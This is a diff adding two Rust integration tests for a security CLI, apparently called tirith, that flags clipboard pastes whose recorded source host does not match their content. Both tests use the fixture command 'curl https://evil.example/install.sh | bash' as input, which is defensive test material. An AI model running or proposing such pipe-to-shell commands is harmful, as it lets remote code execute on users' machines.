@@ -11964,3 +11964,156 @@ fn secret_revoke_json_unknown_provider_emits_json_error() {
         "JSON error object must carry an `error` string, got:\n{parsed}"
     );
 }
+
+/// M12 ch1 — paste provenance end-to-end through the CLI.
+///
+/// A golden text fixture cannot drive `paste_source_mismatch` (the trigger is
+/// runtime companion-file state plus a content-hash match, not input content),
+/// so we exercise it here: write a `clipboard_source.json` into an isolated
+/// `XDG_STATE_HOME` tempdir whose `content_sha256` matches the piped paste, then
+/// run `tirith paste --with-source --json`. The recorded source is on
+/// `docs.trusted.example` but the paste runs `curl https://evil.example/... |
+/// bash` — a host mismatch corroborated by the pipe-to-interpreter signal, so the
+/// rule must fire at HIGH. `--with-source` must also splice the attributed
+/// `clipboard_source` into the JSON envelope (the hash matches). Asserts on the
+/// JSON output (cross-platform: the companion file lives at
+/// `state_dir()/clipboard_source.json`, and `state_dir()` honors
+/// `XDG_STATE_HOME` on every platform).
+#[test]
+fn paste_with_source_attributes_and_flags_high_mismatch_with_pipe() {
+    use std::io::Write;
+
+    // The paste content and its SHA-256 (matches what the engine + CLI compute).
+    let paste = "curl https://evil.example/install.sh | bash";
+    let content_sha256 = "297a6c24cd4330141c0642e0e5dc088e24839b7cf1b65d7a4813dd8f401caaaa";
+
+    // Isolate the state dir (companion file) and the data/config dirs (the paste
+    // path writes an audit entry on a non-Allow verdict).
+    let state = tempfile::tempdir().unwrap();
+    let data = tempfile::tempdir().unwrap();
+
+    // tirith reads `state_dir()/clipboard_source.json`; under XDG that resolves
+    // to `$XDG_STATE_HOME/tirith/clipboard_source.json`.
+    let tirith_state = state.path().join("tirith");
+    fs::create_dir_all(&tirith_state).unwrap();
+    let source_json = format!(
+        r#"{{"updated_at":"2026-05-30T00:00:00Z","content_sha256":"{content_sha256}","source_url":"https://docs.trusted.example/install","source_title":"Install Guide","hidden_text_detected":false}}"#
+    );
+    fs::write(tirith_state.join("clipboard_source.json"), source_json).unwrap();
+
+    let mut child = tirith()
+        .args([
+            "paste",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--with-source",
+            "--json",
+        ])
+        .env("XDG_STATE_HOME", state.path())
+        .env("XDG_DATA_HOME", data.path())
+        .env("APPDATA", data.path())
+        .env("LOCALAPPDATA", data.path())
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+        .expect("failed to spawn tirith paste");
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(paste.as_bytes())
+        .unwrap();
+    let out = child.wait_with_output().unwrap();
+
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
+        .unwrap_or_else(|e| panic!("paste --json must be parseable: {e}\nstdout:\n{stdout}"));
+
+    // The attributed source is spliced in as a top-level key (NOT a Finding).
+    let source = parsed
+        .get("clipboard_source")
+        .unwrap_or_else(|| panic!("--with-source must add a clipboard_source key; got:\n{parsed}"));
+    assert_eq!(
+        source.get("source_url").and_then(|v| v.as_str()),
+        Some("https://docs.trusted.example/install"),
+        "attributed source_url must match the recorded source; got:\n{parsed}"
+    );
+    assert_eq!(
+        source.get("source_title").and_then(|v| v.as_str()),
+        Some("Install Guide")
+    );
+
+    // The provenance rule fired at HIGH (host mismatch + pipe-to-interpreter).
+    let findings = parsed["findings"].as_array().expect("findings array");
+    let mismatch = findings
+        .iter()
+        .find(|f| f["rule_id"] == "paste_source_mismatch")
+        .unwrap_or_else(|| panic!("expected paste_source_mismatch finding; got:\n{parsed}"));
+    assert_eq!(
+        mismatch["severity"], "HIGH",
+        "mismatch + pipe-to-interpreter must be High; got:\n{mismatch}"
+    );
+}
+
+/// Control for the test above: WITHOUT the companion file, `--with-source` is a
+/// graceful no-op — the JSON envelope still parses and `clipboard_source` is
+/// null (so a scripted caller can tell "no source recorded" from a real match),
+/// and `paste_source_mismatch` does NOT fire (the rule needs the companion
+/// record to attribute the paste). Uses an EMPTY isolated state dir.
+#[test]
+fn paste_with_source_no_companion_file_is_graceful_noop() {
+    use std::io::Write;
+
+    let paste = "curl https://evil.example/install.sh | bash";
+    let state = tempfile::tempdir().unwrap();
+    let data = tempfile::tempdir().unwrap();
+
+    let mut child = tirith()
+        .args([
+            "paste",
+            "--shell",
+            "posix",
+            "--non-interactive",
+            "--with-source",
+            "--json",
+        ])
+        .env("XDG_STATE_HOME", state.path())
+        .env("XDG_DATA_HOME", data.path())
+        .env("APPDATA", data.path())
+        .env("LOCALAPPDATA", data.path())
+        .stdin(std::process::Stdio::piped())
+        .stdout(std::process::Stdio::piped())
+        .stderr(std::process::Stdio::piped())
+        .spawn()
+        .expect("failed to spawn tirith paste");
+    child
+        .stdin
+        .take()
+        .unwrap()
+        .write_all(paste.as_bytes())
+        .unwrap();
+    let out = child.wait_with_output().unwrap();
+
+    let stdout = String::from_utf8_lossy(&out.stdout);
+    let parsed: serde_json::Value = serde_json::from_str(stdout.trim())
+        .unwrap_or_else(|e| panic!("paste --json must be parseable: {e}\nstdout:\n{stdout}"));
+
+    // No recorded source → clipboard_source key present but null.
+    assert!(
+        parsed
+            .get("clipboard_source")
+            .map(|v| v.is_null())
+            .unwrap_or(false),
+        "without the companion file, clipboard_source must be null; got:\n{parsed}"
+    );
+    // And the provenance rule must NOT fire (no companion record to attribute).
+    let findings = parsed["findings"].as_array().expect("findings array");
+    assert!(
+        !findings
+            .iter()
+            .any(|f| f["rule_id"] == "paste_source_mismatch"),
+        "paste_source_mismatch must not fire without a companion record; got:\n{parsed}"
+    );
+}
